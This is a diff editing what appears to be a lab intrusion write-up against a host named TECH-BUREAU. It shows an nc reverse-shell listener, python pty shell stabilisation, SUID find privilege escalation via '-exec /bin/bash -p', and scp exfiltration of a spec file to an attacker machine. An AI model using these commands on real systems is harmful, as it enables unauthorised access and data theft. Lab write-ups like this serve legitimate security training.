@@ -146,50 +146,72 @@ Connection received on 192.168.1.10 55712
 ## 06.STABILIZING THE SHELL
 
 <pre data-label="shell stabelized"><code>
-<span class="orange">square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
+<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 192.168.1.10 55712
-<span class="orange">python3 -c "import pty;pty.spawn('/bin/bash')"</strong></span>
+<span class="orange"><strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong></span>
 mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ <span class="orange">export TERM=xterm</strong></span>
-export TERM=xterm ## <span class="orange">PRESS CTRL-Z</strong></span> ##
+export TERM=xterm
 mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ ^Z
 [1]+  Stopped                 nc -lvnp 4444
-square@AT4K-3XPR3S:~/BUREAU.02$ <span class="orange">stty raw -echo; fg</strong></span>
+square@AT4K-3XPR3S:~/BUREAU.02$ <span class="orange"><strong>stty raw -echo; fg</strong></span>
 nc -lvnp 4444
-             <span class="orange">whoami</strong></span>
+             <span class="orange"><strong>whoami</strong></span>
 mysql
-<span class="orange">mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/var/lib/mysql$ 
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/var/lib/mysql$ 
 </code></pre>
+Stabilising teh shell is crutial to have proper cli capabilities of a working terminal.<br>
+Without the stabilisation some commands wouldnt run and the shell is very fragile.<br>
+So we spawn a python shell "enterpreter" and then run a few more commands to bring in the full functionality.<br>
+Here is an example of a messed up shell stabilization, I did not use the Ctrl-Z comand in the right order<br>
+and I have failed to run the "*stty raw -echo; fg*" command on my netcat listener.<br>
+HOWEVER it still worked for my future endevours. 
 
-## 07.CD IN TO PROJECT
+## 07.CD IN TO PROJECT.5527
 
+<pre data-label="CD attempt"><code>
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/ls
+PROJECT.5527  TOOLS
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd PROJECT.5527/
-bash: cd: PROJECT.5527/: Permission denied
+bash: cd: PROJECT.5527/: <span class="red"><strong>Permission denied</strong></span>
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd TOOLS
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls
-'=1000'   engineer_find
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ 
+<span class="orange"><strong>engineer_find</strong></span>
+</code></pre>
 
+We cant access the PROJECT folder due to inadequate permission level of user **sql**.<br>
+Luckily we notice TOOL folder with a *find* binary inside. We check it out.
 
-FINDING THE SUID
+## 08.Examining the binary
 
+<pre data-label="File Check"><code>
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls -l
 total 200
--rwsr-xr-x 1 lead_engineer lead_engineer 204264 Mar 12 10:39  engineer_find
+-rw<span class="orange"><strong>s</strong></span>r-xr-<span class="orange"><strong>x</strong></span> 1 lead_engineer lead_engineer 204264 Mar 12 10:39  engineer_find
+</code></pre>
 
-PRIVILEGE ESCALATION
+We see that the binary is configured to be executable by **all**, and most importantly the **s** bit is set,<br>
+wich grants the find comand the priviliges of *lead_engineer* upon execution. This can be used for escalation.<br>
 
+## 09.SUID Privilege Escalation
+
+<pre data-label="SUID breakout"><code>
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ./engineer_find . -exec /bin/bash -p \; -quit
 bash-5.2$ whoami
-lead_engineer
+<span class="orange"><strong>lead_engineer</strong></span>
 bash-5.2$ 
+</code></pre>
 
+We use the GTFObins as the code source, this technique is a stealthy living of the land concept.<br>
+We use what is provided by the host system. The *find* binary by default alows the execute comand<br>
+so a /bin/bash command is what grants us the shell and the -p flag gives the persistance of the *lead_engineer* privileges.<br>
 
-CAT DATA
+## 10.CONFIRM DATA
 
+<pre data-label="SUID breakout"><code>
 bash-5.2$ cd PROJECT.5527/
 bash-5.2$ ls
-Frame_specs.txt  Valve_specs.txt
+Frame_specs.txt  <span class="orange"><strong>Valve_specs.txt</strong></span>
 bash-5.2$ cat Valve_specs.txt 
 T1s shall use poppet valves!
 (Instead of the normal spool-shaped, sliding valve system.)
@@ -200,28 +222,35 @@ A dedicated exhaust valve is opened, allowing steam to escape the cylinder.
 
 Result: dramatically improved steam-usage efficiency.
 bash-5.2$ 
+</code></pre>
 
+We can now easily access the data filder and check the new file,<br>
+it is accessable and in fact what we are looking for.<br>
 
-SCP DATA
+## 11.SECURE COPY PROTOCOL
 
-
+<pre data-label="SCP Exfiltration"><code>
 bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
 The authenticity of host '192.168.1.16 (192.168.1.16)' can't be established.
 ED25519 key fingerprint is SHA256:4km0uXkh784O7Fc9TGf4Yc8rC2+2ZmvxXSkYLMD8w/Y.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Could not create directory '/nonexistent/.ssh' (No such file or directory).
-Failed to add the host to the list of known hosts (/nonexistent/.ssh/known_hosts).
-square@192.168.1.16's password: 
-Valve_specs.txt                               100%  396    37.5KB/s   00:00   
+square@192.168.1.16's password: <span class="orange"><strong>********</strong></span> 
+<span class="red"><strong>Valve_specs.txt</strong></span>                               <span class="orange"><strong>100%</strong></span>  396    37.5KB/s   00:00   
+</code></pre>
 
-EXIT
+In this scenario we asume that the http/https trafic out is closeley monitored,<br>
+and we want to be hidden, so we simply use the Secure Copy protocol over SSH port 22.<br>
+The data is safeley exfiltrated over an encrypted channel. The Sneak Way.<br>
 
+## 12.EXIT
+<pre data-label="Exit"><code>
 exit
 mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ exit
 exit
+</code></pre>
 
-
+Thank You. Good Bye.
 
 
 
